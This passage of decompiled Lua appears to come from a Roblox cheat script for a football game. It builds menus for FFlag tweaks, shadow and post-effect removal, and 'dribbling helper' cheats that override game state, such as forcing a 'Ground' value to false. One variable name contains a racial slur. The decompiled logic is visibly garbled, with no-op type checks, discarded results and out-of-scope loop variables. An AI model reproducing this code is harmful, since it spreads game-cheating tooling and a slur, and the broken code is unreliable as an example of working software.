r3120.CornerRadius = UDim_New(0, 5);
local UIStroke_51 = Instance.new"UIStroke";
UIStroke_51.Color = R294_Result_4;
UIStroke_51.Parent = TextButton_33;
local FFlagDarkAbyss = Instance.new"TextLabel";
FFlagDarkAbyss.Size = UDim2_New(1, 0, 0, 32);
FFlagDarkAbyss.Position = UDim2_New(0, 0, 0, 0);
FFlagDarkAbyss.BackgroundTransparency = 1;
FFlagDarkAbyss.Text = "FFlagDarkAbyss";
FFlagDarkAbyss.TextColor3 = R294_Result_6;
FFlagDarkAbyss.Font = Enum.Font.GothamBold;
FFlagDarkAbyss.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
FFlagDarkAbyss.TextXAlignment = Enum.TextXAlignment.Center;
FFlagDarkAbyss.Parent = TextButton_33;
TextButton_33.MouseButton1Click:Connect(function(a_116, b_116, c_116)
    TweenService:Create(TextButton_33, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_33, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_117, b_117, c_117)
        game:GetService("Lighting");
        for for_key_14, for_val_14 in pairs(Lighting:GetChildren()) do
            for_val_14:IsA("Sky");
            for_val_14:Destroy();
        end;
        _97MZUISRLYGOATNIGGARS = Instance.new"Sky";
        _97MZUISRLYGOATNIGGARS.Name = "97MZUISRLYGOATNIGGARS";
        _97MZUISRLYGOATNIGGARS.SkyboxBk = "rbxassetid://0";
        _97MZUISRLYGOATNIGGARS.SkyboxDn = "rbxassetid://0";
        _97MZUISRLYGOATNIGGARS.SkyboxFt = "rbxassetid://0";
        _97MZUISRLYGOATNIGGARS.SkyboxLf = "rbxassetid://0";
        _97MZUISRLYGOATNIGGARS.SkyboxRt = "rbxassetid://0";
        _97MZUISRLYGOATNIGGARS.SkyboxUp = "rbxassetid://0";
        _97MZUISRLYGOATNIGGARS.Parent = Lighting;
        Lighting.Ambient = FromRGB(128, 128, 128);
        FromRGB(100, 100, 100);
        Lighting.FogColor = FromRGB(120, 120, 120);
    end);
end);
local TextButton_34 = Instance.new"TextButton";
TextButton_34.Size = UDim2_New(1, 0, 0, 26);
TextButton_34.BackgroundTransparency = 1;
TextButton_34.Text = "";
TextButton_34.AutoButtonColor = false;
TextButton_34.LayoutOrder = 3;
TextButton_34.Parent = Frame_77;
local Frame_81 = Instance.new"Frame";
Frame_81.Size = UDim2_New(0, 16, 0, 16);
Frame_81.Position = UDim2_New(0, 0, 0.5, -8);
Frame_81.BackgroundColor3 = FromRGB(23, 23, 23);
Frame_81.Parent = TextButton_34;
r3144 = Instance.new("UICorner", Frame_81);
r3144.CornerRadius = UDim_New(0, 4);
local ImageLabel_18 = Instance.new"ImageLabel";
ImageLabel_18.Size = UDim2_New(0, 10, 0, 10);
ImageLabel_18.Position = UDim2_New(0.5, -5, 0.5, -5);
ImageLabel_18.BackgroundTransparency = 1;
ImageLabel_18.Image = "rbxassetid://83827110621355";
ImageLabel_18.ImageColor3 = FromRGB(35, 35, 35);
ImageLabel_18.ImageTransparency = 1;
ImageLabel_18.Parent = Frame_81;
local FFlagOverrideTexture = Instance.new"TextLabel";
FFlagOverrideTexture.Size = UDim2_New(1, -26, 1, 0);
FFlagOverrideTexture.Position = UDim2_New(0, 20, 0, 0);
FFlagOverrideTexture.BackgroundTransparency = 1;
FFlagOverrideTexture.Text = "FFlagOverrideTexture";
FFlagOverrideTexture.TextColor3 = R294_Result_6;
FFlagOverrideTexture.Font = Enum.Font.GothamBold;
FFlagOverrideTexture.TextSize = 13;
FFlagOverrideTexture.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
FFlagOverrideTexture.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
FFlagOverrideTexture.TextYAlignment = Enum.TextYAlignment.Center;
FFlagOverrideTexture.Parent = TextButton_34;
TextButton_34.MouseButton1Click:Connect(function(a_118, b_118, c_118)
    TweenService:Create(Frame_81, r1036(0.15), {
        ["BackgroundColor3"] = R294_Result_5
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_18, r1036(0), {
        ["ImageTransparency"] = 0
    }):Play();
    r1040:Play();
    pcall(function(p1_120, a_120, b_120, c_120)
        game:GetService("Lighting");
        local _ = fenv.settings().Rendering.QualityLevel;
        pcall(function(a_119, b_119, c_119)
            local _ = Enum.QualityLevel.Level03;
            fenv.settings().Rendering.QualityLevel = Enum.QualityLevel.Level03;
        end);
        for for_key_15, for_val_15 in pairs(workspace:GetDescendants()) do
            for_val_15:IsA("BasePart");
            local _ = Enum.Material.SmoothPlastic;
            for_val_15.Material = Enum.Material.SmoothPlastic;
            for_val_15.Reflectance = 0;
        end;
    end);
end);
local ReachConnections = getgenv().ReachConnections;
getgenv().ReachConnections = ReachConnections;
local TextButton_35 = Instance.new"TextButton";
TextButton_35.Size = UDim2_New(1, 0, 0, 26);
TextButton_35.BackgroundTransparency = 1;
TextButton_35.Text = "";
TextButton_35.AutoButtonColor = false;
TextButton_35.LayoutOrder = 4;
TextButton_35.Parent = Frame_77;
local Frame_82 = Instance.new"Frame";
Frame_82.Size = UDim2_New(0, 16, 0, 16);
Frame_82.Position = UDim2_New(0, 0, 0.5, -8);
Frame_82.BackgroundColor3 = FromRGB(23, 23, 23);
Frame_82.Parent = TextButton_35;
r3177 = Instance.new("UICorner", Frame_82);
r3177.CornerRadius = UDim_New(0, 4);
local ImageLabel_19 = Instance.new"ImageLabel";
ImageLabel_19.Size = UDim2_New(0, 10, 0, 10);
ImageLabel_19.Position = UDim2_New(0.5, -5, 0.5, -5);
ImageLabel_19.BackgroundTransparency = 1;
ImageLabel_19.Image = "rbxassetid://83827110621355";
ImageLabel_19.ImageColor3 = FromRGB(35, 35, 35);
ImageLabel_19.ImageTransparency = 1;
ImageLabel_19.Parent = Frame_82;
local Disable_Player_Shadows = Instance.new"TextLabel";
Disable_Player_Shadows.Size = UDim2_New(1, -26, 1, 0);
Disable_Player_Shadows.Position = UDim2_New(0, 20, 0, 0);
Disable_Player_Shadows.BackgroundTransparency = 1;
Disable_Player_Shadows.Text = "Disable Player Shadows";
Disable_Player_Shadows.TextColor3 = R294_Result_6;
Disable_Player_Shadows.Font = Enum.Font.GothamBold;
Disable_Player_Shadows.TextSize = 13;
Disable_Player_Shadows.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Disable_Player_Shadows.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Disable_Player_Shadows.TextYAlignment = Enum.TextYAlignment.Center;
Disable_Player_Shadows.Parent = TextButton_35;
TextButton_35.MouseButton1Click:Connect(function(a_121, b_121, c_121)
    TweenService:Create(Frame_82, r1036(0.15), {
        ["BackgroundColor3"] = R294_Result_5
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_19, r1036(0), {
        ["ImageTransparency"] = 0
    }):Play();
    r1040:Play();
    pcall(function(p1_122, a_122, b_122, c_122)
        local _ = getgenv().ReachConnections.DisablePlayerShadows;
        getgenv().ReachConnections.DisablePlayerShadows:Disconnect();
        getgenv().ReachConnections.DisablePlayerShadows = nil;
        ReachConnections.DisablePlayerShadows = nil;
        game:GetService("Players");
        Players_2 = Players:GetPlayers();
        for for_key_16, for_val_16 in pairs(Players_2) do
            local _ = Players_2[1].Character;
        end;
        for for_key_17, for_val_17 in pairs(for_val_16.Character:GetDescendants()) do
            for_val_17:IsA("BasePart");
            for_val_17.CastShadow = false;
        end;
    end;
    Connection = Players.PlayerAdded:Connect(function(player, a_139, b_139, c_139)
        player.CharacterAdded:Connect(function(p1_140, a_140, b_140, c_140)
            Descendants = p1_140:GetDescendants();
            for for_key_21, for_val_21 in pairs(Descendants) do
                for_val_21:IsA("BasePart");
                for_val_21.CastShadow = false;
            end;
        end);
    end);
    getgenv().ReachConnections.DisablePlayerShadows = Connection;
    ReachConnections.DisablePlayerShadows = Connection;
    Players_3 = Players:GetPlayers();
    for for_key_18, for_val_18 in pairs(Players_3) do
        local _ = Players_3[1].CharacterAdded;
        for_val_18.CharacterAdded:Connect(function(p1_140, a_140, b_140, c_140)
            Descendants = p1_140:GetDescendants();
            for for_key_21, for_val_21 in pairs(Descendants) do
                for_val_21:IsA("BasePart");
                for_val_21.CastShadow = false;
            end;
        end);
    end;
    end);
end);
local TextButton_36 = Instance.new"TextButton";
TextButton_36.Size = UDim2_New(1, 0, 0, 26);
TextButton_36.BackgroundTransparency = 1;
TextButton_36.Text = "";
TextButton_36.AutoButtonColor = false;
TextButton_36.LayoutOrder = 5;
TextButton_36.Parent = Frame_77;
local Frame_83 = Instance.new"Frame";
Frame_83.Size = UDim2_New(0, 16, 0, 16);
Frame_83.Position = UDim2_New(0, 0, 0.5, -8);
Frame_83.BackgroundColor3 = FromRGB(23, 23, 23);
Frame_83.Parent = TextButton_36;
r3209 = Instance.new("UICorner", Frame_83);
r3209.CornerRadius = UDim_New(0, 4);
local ImageLabel_20 = Instance.new"ImageLabel";
ImageLabel_20.Size = UDim2_New(0, 10, 0, 10);
ImageLabel_20.Position = UDim2_New(0.5, -5, 0.5, -5);
ImageLabel_20.BackgroundTransparency = 1;
ImageLabel_20.Image = "rbxassetid://83827110621355";
ImageLabel_20.ImageColor3 = FromRGB(35, 35, 35);
ImageLabel_20.ImageTransparency = 1;
ImageLabel_20.Parent = Frame_83;
local Disable_Post_FX = Instance.new"TextLabel";
Disable_Post_FX.Size = UDim2_New(1, -26, 1, 0);
Disable_Post_FX.Position = UDim2_New(0, 20, 0, 0);
Disable_Post_FX.BackgroundTransparency = 1;
Disable_Post_FX.Text = "Disable Post-FX";
Disable_Post_FX.TextColor3 = R294_Result_6;
Disable_Post_FX.Font = Enum.Font.GothamBold;
Disable_Post_FX.TextSize = 13;
Disable_Post_FX.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Disable_Post_FX.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Disable_Post_FX.TextYAlignment = Enum.TextYAlignment.Center;
Disable_Post_FX.Parent = TextButton_36;
TextButton_36.MouseButton1Click:Connect(function(a_123, b_123, c_123)
    TweenService:Create(Frame_83, r1036(0.15), {
        ["BackgroundColor3"] = R294_Result_5
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_20, r1036(0), {
        ["ImageTransparency"] = 0
    }):Play();
    r1040:Play();
    pcall(function(p1_124, a_124, b_124, c_124)
        game:GetService("Lighting");
        for for_key_19, for_val_19 in pairs(Lighting:GetChildren()) do
            for_val_19:IsA("PostEffect");
            for_val_19.Enabled = false;
        end;
        for for_key_20, for_val_20 in pairs(workspace.CurrentCamera:GetChildren()) do
            for_val_20:IsA("PostEffect");
            for_val_20.Enabled = false;
        end;
    end);
end);
local TextButton_37 = Instance.new"TextButton";
TextButton_37.Size = UDim2_New(1, 0, 0, 40);
TextButton_37.BackgroundTransparency = 1;
TextButton_37.Text = "";
TextButton_37.AutoButtonColor = false;
TextButton_37.Parent = ScrollingFrame;
local Frame_84 = Instance.new"Frame";
Frame_84.Size = UDim2_New(0, 3, 0, 22);
Frame_84.Position = UDim2_New(0, 0, 0.5, -11);
Frame_84.BackgroundColor3 = R294_Result_5;
Frame_84.BackgroundTransparency = 1;
Frame_84.Parent = TextButton_37;
r3239 = Instance.new("UICorner", Frame_84);
r3239.CornerRadius = UDim_New(1, 0);
local Dribbling_Helpers = Instance.new"TextLabel";
Dribbling_Helpers.Size = UDim2_New(1, -12, 0, 18);
Dribbling_Helpers.Position = UDim2_New(0, 12, 0, 4);
Dribbling_Helpers.BackgroundTransparency = 1;
Dribbling_Helpers.Text = "Dribbling Helpers";
Dribbling_Helpers.TextColor3 = R294_Result_7;
local _ = Enum.Font.GothamBold;
Dribbling_Helpers.Font = Enum.Font.GothamBold;
Dribbling_Helpers.TextSize = 11;
local _ = Enum.TextXAlignment.Left;
Dribbling_Helpers.TextXAlignment = Enum.TextXAlignment.Left;
Dribbling_Helpers.Parent = TextButton_37;
local Helps_With_Skills_Dribbles = Instance.new"TextLabel";
Helps_With_Skills_Dribbles.Size = UDim2_New(1, -12, 0, 14);
Helps_With_Skills_Dribbles.Position = UDim2_New(0, 12, 0, 21);
Helps_With_Skills_Dribbles.BackgroundTransparency = 1;
Helps_With_Skills_Dribbles.Text = "Helps, with skills dribbles";
Helps_With_Skills_Dribbles.TextColor3 = R294_Result_7;
local _ = Enum.Font.Gotham;
Helps_With_Skills_Dribbles.Font = Enum.Font.Gotham;
Helps_With_Skills_Dribbles.TextSize = 11;
local _ = Enum.TextXAlignment.Left;
Helps_With_Skills_Dribbles.TextXAlignment = Enum.TextXAlignment.Left;
Helps_With_Skills_Dribbles.Parent = TextButton_37;
local Frame_85 = Instance.new"Frame";
Frame_85.Size = UDim2_New(1, 0, 1, 0);
Frame_85.BackgroundTransparency = 1;
Frame_85.Visible = false;
Frame_85.Parent = Frame_3;
local ScrollingFrame_17 = Instance.new"ScrollingFrame";
ScrollingFrame_17.Size = UDim2_New(0.5, -8, 1, -10);
ScrollingFrame_17.Position = UDim2_New(0, 6, 0, 5);
ScrollingFrame_17.BackgroundTransparency = 1;
ScrollingFrame_17.ScrollBarThickness = 1;
ScrollingFrame_17.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_17.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_17.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_17.Parent = Frame_85;
local UIListLayout_32 = Instance.new"UIListLayout";
UIListLayout_32.Padding = UDim_New(0, 8);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_32.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_32.Parent = ScrollingFrame_17;
local ScrollingFrame_18 = Instance.new"ScrollingFrame";
ScrollingFrame_18.Size = UDim2_New(0.5, -8, 1, -10);
ScrollingFrame_18.Position = UDim2_New(0.5, 2, 0, 5);
ScrollingFrame_18.BackgroundTransparency = 1;
ScrollingFrame_18.ScrollBarThickness = 1;
ScrollingFrame_18.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_18.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_18.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_18.Parent = Frame_85;
local UIListLayout_33 = Instance.new"UIListLayout";
UIListLayout_33.Padding = UDim_New(0, 8);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_33.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_33.Parent = ScrollingFrame_18;
TextButton_37.MouseButton1Click:Connect(function(a_125, b_125, c_125)
    local _ = TextButton_31 == TextButton_37;
    TweenService:Create(Frame_74, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(FFlags, r1036(0.2), {
        ["TextColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    Frame_75.Visible = false;
    TweenService:Create(Frame_84, r1036(0.2), {
        ["BackgroundTransparency"] = 0
    }):Play();
    r1040:Play();
    TweenService:Create(Dribbling_Helpers, r1036(0.2), {
        ["TextColor3"] = R294_Result_6
    }):Play();
    r1040:Play();
    Frame_85.Visible = true;
end);
local Frame_86 = Instance.new"Frame";
Frame_86.Size = UDim2_New(1, 0, 0, 30);
Frame_86.BackgroundColor3 = R294_Result_3;
Frame_86.BorderSizePixel = 0;
ScrollingFrame_17:GetChildren();
Frame_86.LayoutOrder = 0;
Frame_86.Parent = ScrollingFrame_17;
r3299 = Instance.new("UICorner", Frame_86);
r3299.CornerRadius = UDim_New(0, 6);
local UIStroke_52 = Instance.new"UIStroke";
UIStroke_52.Color = R294_Result_4;
UIStroke_52.Parent = Frame_86;
local Skills = Instance.new"TextLabel";
Skills.Size = UDim2_New(1, -16, 0, 26);
Skills.Position = UDim2_New(0, 8, 0, 2);
Skills.BackgroundTransparency = 1;
Skills.Text = "Skills";
Skills.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Skills.Font = Enum.Font.GothamBold;
Skills.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Skills.TextXAlignment = Enum.TextXAlignment.Left;
Skills.Parent = Frame_86;
local Frame_87 = Instance.new"Frame";
Frame_87.Size = UDim2_New(1, 0, 1, -28);
Frame_87.Position = UDim2_New(0, 0, 0, 28);
Frame_87.BackgroundTransparency = 1;
Frame_87.Parent = Frame_86;
local UIListLayout_34 = Instance.new"UIListLayout";
UIListLayout_34.Padding = UDim_New(0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_34.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_34.Parent = Frame_87;
local UIPadding_25 = Instance.new"UIPadding";
UIPadding_25.PaddingLeft = UDim_New(0, 8);
UIPadding_25.PaddingRight = UDim_New(0, 8);
UIPadding_25.PaddingBottom = UDim_New(0, 8);
UIPadding_25.Parent = Frame_87;
UIListLayout_34:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function(a_126, b_126, c_126)
    Frame_86.Size = UDim2_New(
        1,
        0,
        0,
        UIListLayout_34.AbsoluteContentSize.Y + 36
    );
end);
local TextButton_38 = Instance.new"TextButton";
TextButton_38.Size = UDim2_New(1, 0, 0, 32);
TextButton_38.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_38.AutoButtonColor = false;
TextButton_38.Text = "";
TextButton_38.ClipsDescendants = true;
TextButton_38.LayoutOrder = 1;
TextButton_38.Parent = Frame_87;
r3338 = Instance.new("UICorner", TextButton_38);
r3338.CornerRadius = UDim_New(0, 5);
local UIStroke_53 = Instance.new"UIStroke";
UIStroke_53.Color = R294_Result_4;
UIStroke_53.Parent = TextButton_38;
local Auto_Regex = Instance.new"TextLabel";
Auto_Regex.Size = UDim2_New(1, 0, 0, 32);
Auto_Regex.Position = UDim2_New(0, 0, 0, 0);
Auto_Regex.BackgroundTransparency = 1;
Auto_Regex.Text = "Auto Inf Fast [ C ]";
Auto_Regex.TextColor3 = R294_Result_6;
Auto_Regex.Font = Enum.Font.GothamBold;
Auto_Regex.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Auto_Regex.TextXAlignment = Enum.TextXAlignment.Center;
Auto_Regex.Parent = TextButton_38;
TextButton_38.MouseButton1Click:Connect(function(a_127, b_127, c_127)
    TweenService:Create(TextButton_38, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_38, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_128, b_128, c_128)
        game:GetService("Players");
        game:GetService("UserInputService");
        workspace:WaitForChild("TPSSystem"):WaitForChild("TPS");
        _G.HoldGround = false;
        UserInputService.InputBegan:Connect(function(input_9, gameProcessedEvent, a_141, b_141, c_141) end);
        RunService.Heartbeat:Connect(function(a_141, b_141, c_141)
            workspace:WaitForChild("TPSSystem"):WaitForChild("TPS"):IsA("BasePart");
            Backpack:FindFirstChild("Ground").Value = false;
        end);
    end);
end);
local TextButton_39 = Instance.new"TextButton";
TextButton_39.Size = UDim2_New(1, 0, 0, 26);
TextButton_39.BackgroundTransparency = 1;
TextButton_39.Text = "";
TextButton_39.AutoButtonColor = false;
TextButton_39.LayoutOrder = 2;
TextButton_39.Parent = Frame_87;
local Frame_88 = Instance.new"Frame";
Frame_88.Size = UDim2_New(0, 16, 0, 16);
Frame_88.Position = UDim2_New(0, 0, 0.5, -8);
Frame_88.BackgroundColor3 = FromRGB(23, 23, 23);
Frame_88.Parent = TextButton_39;
r3362 = Instance.new("UICorner", Frame_88);
r3362.CornerRadius = UDim_New(0, 4);
local ImageLabel_21 = Instance.new"ImageLabel";
ImageLabel_21.Size = UDim2_New(0, 10, 0, 10);
ImageLabel_21.Position = UDim2_New(0.5, -5, 0.5, -5);
ImageLabel_21.BackgroundTransparency = 1;
ImageLabel_21.Image = "rbxassetid://83827110621355";
ImageLabel_21.ImageColor3 = FromRGB(35, 35, 35);
ImageLabel_21.ImageTransparency = 1;
ImageLabel_21.Parent = Frame_88;
local ZZZZ_Helper = Instance.new"TextLabel";
ZZZZ_Helper.Size = UDim2_New(1, -26, 1, 0);
ZZZZ_Helper.Position = UDim2_New(0, 20, 0, 0);
ZZZZ_Helper.BackgroundTransparency = 1;
ZZZZ_Helper.Text = "ZZZZ / Helper";
ZZZZ_Helper.TextColor3 = R294_Result_6;
ZZZZ_Helper.Font = Enum.Font.GothamBold;
ZZZZ_Helper.TextSize = 13;
ZZZZ_Helper.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
ZZZZ_Helper.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
ZZZZ_Helper.TextYAlignment = Enum.TextYAlignment.Center;
ZZZZ_Helper.Parent = TextButton_39;
TextButton_39.MouseButton1Click:Connect(function(a_129, b_129, c_129)
    TweenService:Create(Frame_88, r1036(0.15), {
        ["BackgroundColor3"] = R294_Result_5
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_21, r1036(0), {
        ["ImageTransparency"] = 0
    }):Play();
    r1040:Play();
    pcall(function(p1_130, a_130, b_130, c_130)
        TPS1 = Instance.new"Part";
        TPS1.Name = "TPS1";
        Vector3_New = Vector3.new;
        TPS1.Size = Vector3_New(9, 0.1, 9);
        TPS1.Anchored = true;
        TPS1.BrickColor = BrickColor.new"Bright red";
        TPS1.Transparency = 1;
        TPS1.Parent = game.Workspace;
        Position = workspace:FindFirstChild("TPSSystem"):FindFirstChild("TPS").Position;
        TPS1.Position = Position - Vector3_New(0, 1, 0);
        RenderStepped:Connect(function(a_142, b_142, c_142)
            TPS1.Position = Position - Vector3_New(0, 1, 0);
        end);
    end);
end);
local TextButton_40 = Instance.new"TextButton";
TextButton_40.Size = UDim2_New(1, 0, 0, 32);
TextButton_40.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_40.AutoButtonColor = false;
TextButton_40.Text = "";
TextButton_40.ClipsDescendants = true;
TextButton_40.LayoutOrder = 3;
TextButton_40.Parent = Frame_87;
r3389 = Instance.new("UICorner", TextButton_40);
r3389.CornerRadius = UDim_New(0, 5);
local UIStroke_54 = Instance.new"UIStroke";
UIStroke_54.Color = R294_Result_4;
UIStroke_54.Parent = TextButton_40;
local Demonic_ZZ_Helper = Instance.new"TextLabel";
Demonic_ZZ_Helper.Size = UDim2_New(1, 0, 0, 32);
Demonic_ZZ_Helper.Position = UDim2_New(0, 0, 0, 0);
Demonic_ZZ_Helper.BackgroundTransparency = 1;
Demonic_ZZ_Helper.Text = "Demonic ZZ Helper";
Demonic_ZZ_Helper.TextColor3 = R294_Result_6;
Demonic_ZZ_Helper.Font = Enum.Font.GothamBold;
Demonic_ZZ_Helper.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Demonic_ZZ_Helper.TextXAlignment = Enum.TextXAlignment.Center;
Demonic_ZZ_Helper.Parent = TextButton_40;
TextButton_40.MouseButton1Click:Connect(function(a_131, b_131, c_131)
    TweenService:Create(TextButton_40, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_40, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
end);
local TextButton_41 = Instance.new"TextButton";
TextButton_41.Size = UDim2_New(1, 0, 0, 32);
TextButton_41.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_41.AutoButtonColor = false;
TextButton_41.Text = "";
TextButton_41.ClipsDescendants = true;
TextButton_41.LayoutOrder = 4;
TextButton_41.Parent = Frame_87;
r3408 = Instance.new("UICorner", TextButton_41);
r3408.CornerRadius = UDim_New(0, 5);
local UIStroke_55 = Instance.new"UIStroke";
UIStroke_55.Color = R294_Result_4;
UIStroke_55.Parent = TextButton_41;
local Double_Shoot_Helper = Instance.new"TextLabel";
Double_Shoot_Helper.Size = UDim2_New(1, 0, 0, 32);
Double_Shoot_Helper.Position = UDim2_New(0, 0, 0, 0);
Double_Shoot_Helper.BackgroundTransparency = 1;
Double_Shoot_Helper.Text = "Double Shoot Helper";
Double_Shoot_Helper.TextColor3 = R294_Result_6;
Double_Shoot_Helper.Font = Enum.Font.GothamBold;
Double_Shoot_Helper.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Double_Shoot_Helper.TextXAlignment = Enum.TextXAlignment.Center;
Double_Shoot_Helper.Parent = TextButton_41;
TextButton_41.MouseButton1Click:Connect(function(a_132, b_132, c_132)
    TweenService:Create(TextButton_41, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_41, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
end);
local Frame_89 = Instance.new"Frame";
Frame_89.Size = UDim2_New(1, 0, 0, 30);
Frame_89.BackgroundColor3 = R294_Result_3;
Frame_89.BorderSizePixel = 0;
ScrollingFrame_18:GetChildren();
Frame_89.LayoutOrder = 0;
Frame_89.Parent = ScrollingFrame_18;
r3427 = Instance.new("UICorner", Frame_89);
r3427.CornerRadius = UDim_New(0, 6);
local UIStroke_56 = Instance.new"UIStroke";
UIStroke_56.Color = R294_Result_4;
UIStroke_56.Parent = Frame_89;
local Air_Dribble_Helper = Instance.new"TextLabel";
Air_Dribble_Helper.Size = UDim2_New(1, -16, 0, 26);
Air_Dribble_Helper.Position = UDim2_New(0, 8, 0, 2);
Air_Dribble_Helper.BackgroundTransparency = 1;
Air_Dribble_Helper.Text = "Air Dribble Helper";
Air_Dribble_Helper.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Air_Dribble_Helper.Font = Enum.Font.GothamBold;
Air_Dribble_Helper.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Air_Dribble_Helper.TextXAlignment = Enum.TextXAlignment.Left;
Air_Dribble_Helper.Parent = Frame_89;
local Frame_90 = Instance.new"Frame";
Frame_90.Size = UDim2_New(1, 0, 1, -28);
Frame_90.Position = UDim2_New(0, 0, 0, 28);
Frame_90.BackgroundTransparency = 1;
Frame_90.Parent = Frame_89;
local UIListLayout_35 = Instance.new"UIListLayout";
UIListLayout_35.Padding = UDim_New(0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_35.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_35.Parent = Frame_90;
local UIPadding_26 = Instance.new"UIPadding";
UIPadding_26.PaddingLeft = UDim_New(0, 8);
UIPadding_26.PaddingRight = UDim_New(0, 8);
UIPadding_26.PaddingBottom = UDim_New(0, 8);
UIPadding_26.Parent = Frame_90;
UIListLayout_35:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function(a_133, b_133, c_133)
    Frame_89.Size = UDim2_New(
        1,
        0,
        0,
        UIListLayout_35.AbsoluteContentSize.Y + 36
    );
end);
local TextButton_42 = Instance.new"TextButton";
TextButton_42.Size = UDim2_New(1, 0, 0, 26);
TextButton_42.BackgroundTransparency = 1;
TextButton_42.Text = "";
TextButton_42.AutoButtonColor = false;
TextButton_42.LayoutOrder = 1;
TextButton_42.Parent = Frame_90;
local Frame_91 = Instance.new"Frame";
Frame_91.Size = UDim2_New(0, 16, 0, 16);
Frame_91.Position = UDim2_New(0, 0, 0.5, -8);
Frame_91.BackgroundColor3 = FromRGB(23, 23, 23);
Frame_91.Parent = TextButton_42;
r3471 = Instance.new("UICorner", Frame_91);
r3471.CornerRadius = UDim_New(0, 4);
local ImageLabel_22 = Instance.new"ImageLabel";
ImageLabel_22.Size = UDim2_New(0, 10, 0, 10);
ImageLabel_22.Position = UDim2_New(0.5, -5, 0.5, -5);
ImageLabel_22.BackgroundTransparency = 1;
ImageLabel_22.Image = "rbxassetid://83827110621355";
ImageLabel_22.ImageColor3 = FromRGB(35, 35, 35);
ImageLabel_22.ImageTransparency = 1;
ImageLabel_22.Parent = Frame_91;
local Enable_Air_Dribble_Helper = Instance.new"TextLabel";
Enable_Air_Dribble_Helper.Size = UDim2_New(1, -26, 1, 0);
Enable_Air_Dribble_Helper.Position = UDim2_New(0, 20, 0, 0);
Enable_Air_Dribble_Helper.BackgroundTransparency = 1;
Enable_Air_Dribble_Helper.Text = "Enable Air Dribble Helper";
Enable_Air_Dribble_Helper.TextColor3 = R294_Result_6;
Enable_Air_Dribble_Helper.Font = Enum.Font.GothamBold;
Enable_Air_Dribble_Helper.TextSize = 13;
Enable_Air_Dribble_Helper.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Enable_Air_Dribble_Helper.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Enable_Air_Dribble_Helper.TextYAlignment = Enum.TextYAlignment.Center;
Enable_Air_Dribble_Helper.Parent = TextButton_42;
TextButton_42.MouseButton1Click:Connect(function(a_134, b_134, c_134)
    TweenService:Create(Frame_91, r1036(0.15), {
        ["BackgroundColor3"] = R294_Result_5
    }):Play();
    r1040:Play();
